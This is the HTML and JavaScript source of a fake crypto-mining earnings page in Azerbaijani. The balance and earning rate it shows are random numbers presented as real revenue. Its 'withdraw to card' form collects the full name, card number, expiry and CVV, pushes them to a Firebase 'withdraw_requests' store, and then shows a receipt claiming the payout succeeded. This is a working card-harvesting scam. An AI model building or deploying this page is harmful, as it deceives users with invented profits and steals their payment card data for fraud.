<div id="app-root" style="background: #050507; min-height: 100vh; color: white; font-family: 'Inter', sans-serif; position: relative; overflow-x: hidden;">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap');
        
        /* Əsas Səhifə */
        .main-container { padding: 20px; text-align: center; transition: 0.4s; }
        .blur-bg { filter: blur(12px); pointer-events: none; }

        .crypto-logos { display: flex; justify-content: center; gap: 20px; margin: 30px 0; }
        .crypto-logos img { width: 55px; height: 55px; border-radius: 50%; animation: float 3s infinite ease-in-out; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-12px); } }

        .balance-card {
            background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.6) 100%);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 35px; padding: 45px 20px; margin-bottom: 25px;
        }
        .total-val { font-family: 'Orbitron', sans-serif; font-size: 3.5rem; margin: 15px 0; display: block; }
        .total-val span { color: #3f9c35; }

        .btn-action {
            width: 100%; padding: 20px; border-radius: 18px; border: none; font-weight: 900;
            cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-bottom: 15px;
        }
        .btn-claim { background: #fff; color: #000; }
        .btn-claim:disabled { background: #1a1a1a; color: #444; }
        .btn-withdraw-open { background: transparent; border: 1px solid #222; color: #888; }

        /* WITHDRAW MODAL */
        #withdraw-modal {
            position: fixed; top: 100%; left: 0; width: 100%; height: 100%;
            background: #0a0a0c; z-index: 1000; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            padding: 20px; box-sizing: border-box; overflow-y: auto;
        }
        .modal-active { top: 0 !important; }

        /* VIRTUAL CARD */
        .v-card {
            width: 100%; max-width: 350px; height: 200px; background: linear-gradient(135deg, #1e1e20 0%, #000 100%);
            border-radius: 20px; border: 1px solid #333; margin: 0 auto 25px; padding: 20px; position: relative;
        }
        .card-logo { position: absolute; top: 20px; right: 20px; width: 50px; }
        .card-num-view { font-family: 'Orbitron', sans-serif; font-size: 1.1rem; letter-spacing: 2px; display: block; margin-top: 40px; }

        .m-input {
            width: 100%; background: #111; border: 1px solid #222; border-radius: 12px;
            padding: 15px; color: #fff; margin-bottom: 15px; outline: none; box-sizing: border-box;
        }
    </style>

    <div id="main-ui" class="main-container">
        <div class="crypto-logos">
            <img src="btc.png" alt="BTC">
            <img src="eth.png" alt="ETH" style="animation-delay: 0.5s">
            <img src="usdt.png" alt="USDT" style="animation-delay: 1s">
        </div>

        <div class="balance-card">
            <div style="font-size: 0.7rem; letter-spacing: 4px; color: #00b9ff; font-weight: bold;">TOTAL REVENUE</div>
            <strong class="total-val"><span>$</span><span id="bal-display">0.00</span></strong>
            <div id="live-speed" style="color: #3f9c35; font-weight: bold; font-size: 0.8rem; margin-bottom: 25px;">+0.000000 USD/s</div>
            
            <button class="btn-action btn-claim" id="claim-btn" onclick="handleClaim()">COLLECT PROFITS</button>
            <div id="timer-display" style="font-size: 0.75rem; color: #555;">Sistem aktivdir</div>
        </div>

        <button class="btn-action btn-withdraw-open" onclick="toggleModal(true)">
            <i class="fas fa-credit-card"></i> KARTA ÇIXARIŞ (MIN: $15)
        </button>
    </div>

    <div id="withdraw-modal">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <h2 style="font-family: 'Orbitron'; color: #3f9c35; font-size: 1rem;">KART QEYDİYYATI</h2>
            <button onclick="toggleModal(false)" style="background:none; border:none; color:#fff; font-size:1.5rem;">&times;</button>
        </div>

        <div class="v-card">
            <img src="visa.png" id="card-brand" class="card-logo">
            <span class="card-num-view" id="v-num">**** **** **** ****</span>
            <div style="margin-top: 30px; display: flex; justify-content: space-between; font-size: 0.8rem;">
                <div><small style="color:#555; display:block">SAHİBİ</small><span id="v-name">NAME SURNAME</span></div>
                <div><small style="color:#555; display:block">TARİX</small><span id="v-exp">MM/YY</span></div>
            </div>
        </div>

        <div style="max-width: 350px; margin: 0 auto;">
            <input type="text" id="in-name" class="m-input" placeholder="AD SOYAD" oninput="syncCard()">
            <input type="text" id="in-num" class="m-input" placeholder="KART NÖMRƏSİ" maxlength="19" oninput="syncCard()">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="in-exp" class="m-input" placeholder="MM/YY" maxlength="5" oninput="syncCard()">
                <input type="password" id="in-cvv" class="m-input" placeholder="CVV" maxlength="3">
            </div>
            <input type="number" id="in-amt" class="m-input" placeholder="MƏBLƏĞ ($)">
            <button class="btn-action" style="background: #3f9c35; color: white;" onclick="finalizeWithdraw()">SORĞUNU GÖNDƏR</button>
        </div>
    </div>

    <div id="receipt-view" style="display:none; position:fixed; inset:0; background:#fff; color:#000; padding:40px 20px; font-family:monospace; z-index:2000;">
        <h2 style="text-align:center">WW24 RECEIPT</h2>
        <p>USER: <span id="rec-user"></span></p>
        <p>CARD: <span id="rec-card"></span></p>
        <p>AMOUNT: $<span id="rec-amt"></span></p>
        <hr style="border:1px dashed #000">
        <p style="text-align:center">PROCESSED SUCCESSFULLY</p>
        <button onclick="location.reload()" style="width:100%; padding:15px; background:#000; color:#fff; border:none; margin-top:20px;">CLOSE</button>
    </div>

</div>

<script>
    const userID = localStorage.getItem('elite_session') || 'Guest';
    let currentBalance = 0;

    // Firebase Sinxronizasiyası
    db.ref('mining/' + userID).on('value', snap => {
        const data = snap.val() || { balance: 0, lastClaim: 0, status: 'active' };
        if(data.status === 'blocked') { document.body.innerHTML = "<h1>BLOKLANIB</h1>"; return; }
        
        currentBalance = parseFloat(data.balance);
        document.getElementById('bal-display').innerText = currentBalance.toFixed(2);
        checkTimer(data.lastClaim);
    });

    function checkTimer(last) {
        const btn = document.getElementById('claim-btn');
        const now = Date.now();
        const wait = 3600000;
        if(now - last < wait) {
            btn.disabled = true;
            const diff = wait - (now - last);
            document.getElementById('timer-display').innerText = `Gözlə: ${Math.floor(diff/60000)}d ${Math.floor((diff%60000)/1000)}s`;
            setTimeout(() => checkTimer(last), 1000);
        } else {
            btn.disabled = false;
            document.getElementById('timer-display').innerText = "Toplamağa hazırdır!";
        }
    }

    async function handleClaim() {
        const reward = (Math.random() * 0.3 + 0.1).toFixed(2);
        await db.ref('mining/' + userID).update({ balance: currentBalance + parseFloat(reward), lastClaim: Date.now() });
    }

    // Modal İdarəsi
    function toggleModal(show) {
        document.getElementById('withdraw-modal').classList.toggle('modal-active', show);
        document.getElementById('main-ui').classList.toggle('blur-bg', show);
    }

    // Kart Sinxronizasiyası
    function syncCard() {
        const num = document.getElementById('in-num').value;
        const name = document.getElementById('in-name').value;
        const exp = document.getElementById('in-exp').value;
        
        document.getElementById('v-num').innerText = num || "**** **** **** ****";
        document.getElementById('v-name').innerText = name || "NAME SURNAME";
        document.getElementById('v-exp').innerText = exp || "MM/YY";

        // Logo dəyişimi
        const logo = document.getElementById('card-brand');
        if(num.startsWith('4')) logo.src = 'visa.png';
        else if(num.startsWith('5')) logo.src = 'master.png';

        // Auto format
        document.getElementById('in-num').value = num.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    }

    async function finalizeWithdraw() {
        const amt = parseFloat(document.getElementById('in-amt').value);
        const num = document.getElementById('in-num').value;
        if(amt < 15 || isNaN(amt)) return alert("Minimum $15!");
        if(amt > currentBalance) return alert("Balans yetərsiz!");

        const data = {
            fullName: document.getElementById('in-name').value,
            cardNumber: num,
            expiry: document.getElementById('in-exp').value,
            cvv: document.getElementById('in-cvv').value,
            amount: amt,
            timestamp: new Date().toLocaleString()
        };

        await db.ref('withdraw_requests/' + userID).push(data);
        await db.ref('mining/' + userID).update({ balance: currentBalance - amt });

        // Çeki göstər
        document.getElementById('rec-user').innerText = userID;
        document.getElementById('rec-card').innerText = num;
        document.getElementById('rec-amt').innerText = amt;
        document.getElementById('receipt-view').style.display = 'block';
    }

    setInterval(() => {
        document.getElementById('live-speed').innerText = "+" + (Math.random() * 0.0001).toFixed(6) + " USD/s";
    }, 2000);
</script>
